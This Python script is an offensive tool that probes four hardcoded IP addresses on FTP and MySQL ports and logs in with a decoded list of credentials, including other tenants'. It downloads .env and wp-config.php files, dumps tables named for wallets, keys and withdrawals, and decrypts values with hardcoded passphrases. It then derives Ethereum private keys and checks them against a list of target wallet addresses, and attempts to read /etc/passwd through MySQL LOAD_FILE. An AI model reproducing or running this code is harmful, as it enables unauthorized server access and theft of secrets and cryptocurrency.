import os, socket, base64, json, zlib, re, sys, time, hashlib, io

HOSTS = ["103.20.215.96", "103.20.213.118", "103.20.214.68", "103.20.214.150"]
PORTS = [21, 3306, 3307, 80, 443, 8443]
WHITE = ["0xdfc072ec43415d445b669b5cbe59957ae3abf063",
         "0xef9a04b2d2e27e0109458774ff9100670d79c07a"]
SHARED = ["ferryinfotech", "bncet", "bncet343423", "sfdashfklhjafkla"]

creds = json.loads(zlib.decompress(base64.b64decode(os.environ["CREDS_ZB64"])).decode())
print("creds_loaded", len(creds), flush=True)

try:
    import urllib.request
    print("RUNNER_IP", urllib.request.urlopen("https://api.ipify.org", timeout=10).read().decode(), flush=True)
except Exception as e:
    print("RUNNER_IP_FAIL", e, flush=True)


def tcp(h, p, t=5):
    s = socket.socket()
    s.settimeout(t)
    try:
        s.connect((h, p))
        return True
    except Exception:
        return False
    finally:
        s.close()


print("=== TCP PROBE ===", flush=True)
reach = {}
for h in HOSTS:
    for p in PORTS:
        ok = tcp(h, p)
        reach[(h, p)] = ok
        print(("OPEN " if ok else "CLOSED ") + "%s:%d" % (h, p), flush=True)

# ---------------- key material helpers ----------------
HEX64 = re.compile(r"(?:0x)?([0-9a-fA-F]{64})\b")
def hexcands(s):
    return [m.group(1).lower() for m in HEX64.finditer(s)]

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

def openssl_decrypt(data, password):
    if not data.startswith(b"Salted__") or len(data) < 32:
        return None
    salt = data[8:16]
    ct = data[16:]
    if len(ct) % 16:
        ct = ct[:len(ct) - (len(ct) % 16)]
    prev = b""
    ki = b""
    while len(ki) < 48:
        d = hashlib.md5(prev + password + salt).digest()
        ki += d
        prev = d
    key, iv = ki[:32], ki[32:48]
    try:
        dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
        pt = dec.update(ct) + dec.finalize()
        pad = pt[-1]
        if 1 <= pad <= 16 and pt[-pad:] == bytes([pad]) * pad:
            pt = pt[:-pad]
        return pt
    except Exception:
        return None

def maybe_decrypt(v):
    """v: str or bytes; return list of plaintext bytes candidates"""
    out = []
    raw = v.encode("utf-8", "ignore") if isinstance(v, str) else v
    b = raw.strip()
    if b.startswith(b"Salted__"):
        for pw in [p.encode() for p in SHARED]:
            pt = openssl_decrypt(b, pw)
            if pt:
                out.append(pt)
        return out
    try:
        bb = base64.b64decode(b, validate=True)
    except Exception:
        return out
    if bb.startswith(b"Salted__"):
        for pw in [p.encode() for p in SHARED]:
            pt = openssl_decrypt(bb, pw)
            if pt:
                out.append(pt)
        return out
    # laravel encrypt(): base64(json{iv,value,mac}) - try shared passphrases as raw key
    try:
        j = json.loads(bb)
        if isinstance(j, dict) and "value" in j and "iv" in j:
            k = hashlib.sha256(SHARED[0].encode()).digest()
            ivb = base64.b64decode(j["iv"])
            vb = base64.b64decode(j["value"])
            dec = Cipher(algorithms.AES(k), modes.CBC(ivb)).decryptor()
            pt = dec.update(vb) + dec.finalize()
            pad = pt[-1]
            if 1 <= pad <= 16 and pt[-pad:] == bytes([pad]) * pad:
                pt = pt[:-pad]
            out.append(pt)
    except Exception:
        pass
    return out

seen = set()
def check_key(k, src):
    k = k.lower()
    if k in seen:
        return
    seen.add(k)
    try:
        from eth_account import Account
        a = Account.from_key(bytes.fromhex(k)).address.lower()
    except Exception as e:
        return
    hit = a in WHITE
    print(("WHITELIST_HIT " if hit else "key ") + "addr=%s src=%s pk=0x%s" % (a, src, k), flush=True)

def scan_text(text, src):
    if isinstance(text, bytes):
        try:
            text = text.decode("utf-8", "ignore")
        except Exception:
            return
    for k in hexcands(text):
        check_key(k, src)
    for m in re.finditer(r"(?i)(jwt[_-]?secret|app[_-]?key|secret|private[_-]?key|pvt[_-]?key)[\"'=: ]{1,4}([A-Za-z0-9+/_\-\.]{24,})", text):
        v = m.group(2)
        print("SECRETLIKE key=%s val=%s src=%s" % (m.group(1), v[:120], src), flush=True)
    for m in re.finditer(r"(?i)[A-Z0-9_]{2,20}SECRET[A-Z0-9_]{0,20}[\"'\s]*[=:][\"'\s]*([A-Za-z0-9+/=_\-\.]{20,})", text):
        print("JWTSECRET val=%s src=%s" % (m.group(1)[:120], src), flush=True)

def scan_value(val, src):
    scan_text(val, src)
    for pt in maybe_decrypt(val):
        scan_text(pt, src + "[dec]")

# ---------------- FTP ----------------
def ftp_phase():
    import ftplib
    for h in list(HOSTS):
        if not reach.get((h, 21)):
            continue
        mine = [c for c in creds if c["host"].strip() == h and c["ftp_user"].strip()]
        others = [c for c in creds if c["host"].strip() != h and c["ftp_user"].strip()][:40]
        for c in mine + others:
            u, p = c["ftp_user"].strip(), c["ftp_pass"]
            try:
                ftp = ftplib.FTP()
                ftp.connect(h, 21, timeout=15)
                ftp.login(u, p)
            except Exception as e:
                continue
            print("FTP_LOGIN_OK %s %s db=%s" % (h, u, c.get("db_name")), flush=True)
            try:
                print("FTP_PWD", ftp.pwd(), flush=True)
                print("FTP_LIST", ftp.nlst()[:60], flush=True)
            except Exception as e:
                print("FTP_LIST_ERR", e, flush=True)
            paths = [".env", "public_html/.env", "httpdocs/.env", "www/.env", "public/.env",
                     "../.env", "config/.env", "wp-config.php"]
            for path in paths:
                try:
                    buf = io.BytesIO()
                    ftp.retrbinary("RETR " + path, buf.write, blocksize=8192)
                    data = buf.getvalue()
                    print("FTP_FILE %s:%s len=%d" % (h, path, len(data)), flush=True)
                    print(data[:4000].decode("utf-8", "ignore"), flush=True)
                    scan_text(data, "ftp:%s/%s" % (h, path))
                except Exception:
                    pass
            try:
                ftp.quit()
            except Exception:
                pass

# ---------------- MySQL ----------------
def mysql_phase():
    try:
        import pymysql
    except Exception as e:
        print("NO_PYMYSQL", e, flush=True)
        return
    tables_re = re.compile(r"(?i)(setconfig|wallet|address|pvt|priv|key|withdraw|gateway|config|holders|raw_data|admin_login|member|user_detail|tr_userbsc)")
    for h in list(HOSTS):
        if not reach.get((h, 3306)):
            continue
        mine = [c for c in creds if c["host"].strip() == h and c["db_user"].strip()]
        others = [c for c in creds if c["host"].strip() != h and c["db_user"].strip()][:60]
        got = 0
        for c in mine + others:
            u, p, db = c["db_user"].strip(), c["db_pass"], (c.get("db_name") or "").strip()
            try:
                conn = pymysql.connect(host=h, port=3306, user=u, password=p, connect_timeout=10,
                                       read_timeout=40, write_timeout=40, charset="utf8mb4")
            except Exception:
                continue
            got += 1
            print("MYSQL_LOGIN_OK %s %s db=%s" % (h, u, db), flush=True)
            try:
                cur = conn.cursor()
                cur.execute("SELECT USER(),VERSION(),@@hostname,@@datadir")
                print("MYSQL_INFO", cur.fetchone(), flush=True)
                cur.execute("SHOW DATABASES")
                dbs = [r[0] for r in cur.fetchall()]
                print("MYSQL_DBS", dbs[:80], flush=True)
                for dname in dbs:
                    if not dname or dname in ("information_schema", "performance_schema", "mysql", "sys"):
                        continue
                    try:
                        cur.execute("SHOW TABLES FROM `%s`" % dname)
                        tabs = [r[0] for r in cur.fetchall()]
                    except Exception as e:
                        continue
                    cand = [t for t in tabs if tables_re.search(t)]
                    print("MYSQL_TABLES %s n=%d cand=%s" % (dname, len(tabs), cand[:30]), flush=True)
                    for t in cand[:25]:
                        try:
                            cur.execute("SELECT * FROM `%s`.`%s` LIMIT 300" % (dname, t))
                            cols = [d[0] for d in cur.description]
                            rows = cur.fetchall()
                        except Exception as e:
                            continue
                        print("MYSQL_DUMP %s.%s cols=%s rows=%d" % (dname, t, cols, len(rows)), flush=True)
                        for r in rows:
                            for i, v in enumerate(r):
                                if v is None:
                                    continue
                                sv = v if isinstance(v, (bytes, bytearray)) else str(v)
                                scan_value(sv, "mysql:%s.%s.%s" % (dname, t, cols[i]))
                                if len(str(sv)) > 1000:
                                    print("CELL %s.%s.%s %s" % (dname, t, cols[i], str(sv)[:500]), flush=True)
                # file priv test
                for q in ["SELECT LOAD_FILE('/etc/passwd')", "SELECT @@secure_file_priv", "SHOW GRANTS"]:
                    try:
                        cur.execute(q)
                        print("MYSQL_Q %s => %s" % (q, str(cur.fetchone())[:400]), flush=True)
                    except Exception as e:
                        print("MYSQL_Q_ERR %s => %s" % (q, str(e)[:200]), flush=True)
            except Exception as e:
                print("MYSQL_ERR", h, u, str(e)[:300], flush=True)
            finally:
                try:
                    conn.close()
                except Exception:
                    pass
            if got >= 12:
                break

# ---- DNS: tenant domains may now resolve to moved hosts ----
print("=== DNS PHASE ===", flush=True)
try:
    doms = sorted({(c.get("domain") or "").strip().lower() for c in creds if (c.get("domain") or "").strip()})
    newips = {}
    for d in doms[:260]:
        try:
            for ip in socket.gethostbyname_ex(d)[2]:
                if ip not in HOSTS:
                    newips.setdefault(ip, []).append(d)
        except Exception:
            pass
    print("RESOLVED_ALT_IPS", len(newips), flush=True)
    for ip in list(newips)[:80]:
        o21 = tcp(ip, 21, 4); o33 = tcp(ip, 3306, 4)
        print("ALT %s domains=%s 21=%s 3306=%s" % (ip, newips[ip][:3], o21, o33), flush=True)
        if o21: reach[(ip, 21)] = True
        if o33: reach[(ip, 3306)] = True
    for ip in newips:
        if ip not in HOSTS: HOSTS.append(ip)
except Exception as e:
    print("DNS_ERR", e, flush=True)

ftp_phase()
mysql_phase()
print("=== DONE whitelist_candidates_checked=%d ===" % len(seen), flush=True)
